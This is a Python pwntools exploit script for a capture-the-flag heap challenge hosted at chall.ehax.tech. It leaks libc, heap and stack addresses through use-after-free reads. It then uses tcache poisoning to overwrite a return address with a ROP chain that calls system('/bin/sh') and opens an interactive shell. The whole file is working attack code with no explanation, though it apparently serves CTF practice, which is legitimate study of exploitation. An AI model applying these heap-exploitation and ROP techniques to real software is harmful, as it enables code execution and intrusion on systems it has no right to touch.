#!/usr/bin/env python3
from pwn import *
# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'chall.ehax.tech', 1925

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def malloc(index, size, data):
    io.sendlineafter(b"> ", "1")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", data)

def free(index):
    io.sendlineafter(b"> ", "2")
    io.sendlineafter(b"> ", str(index).encode())

def edit(index, buf):
    io.sendlineafter(b"> ", "3")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", buf)

def view(index):
    io.sendlineafter(b"> ", "4")
    io.sendlineafter(b"> ", str(index).encode())

def exploit():
    global io
    io = initialize()
    malloc(0, 0x438, b"") # 0
    malloc(1, 0x18, b"") # 1
    free(0)

    #Libc Leak
    view(0)
    libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = libc_leak - 0x1ecbe0
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search("/bin/sh\0")))
    malloc(0, 0x438, b"") # 0
    malloc(2, 0x18, b"") # 2
    free(1)
    free(2)

    #Heap Leak
    view(2)
    heap = u64(io.recvline().strip().ljust(8, b"\x00")) - 0x6e0
    log.info("Heap base: %#x", heap)
    edit(2, p64(libc.sym["environ"]))

    #Stack Leak
    malloc(3, 0x18, b"") # 3
    malloc(4, 0x0, b"") # 4 size 0 so the \n doesn't get input
    view(4)
    stack = u64(io.recvline().strip().ljust(8, b"\x00"))
    ret = stack - 0x120
    log.info("Stack: %#x", stack)
    log.info("Stack ret: %#x", ret)

    #Overwriting ret
    malloc(5, 0x38, b"")
    malloc(6, 0x38, b"")
    free(5)
    free(6)
    edit(6, p64(ret))
    malloc(7, 0x38, b"")
    malloc(8, 0x38, rop.chain())
    io.interactive()

if __name__ == '__main__':
    exploit()
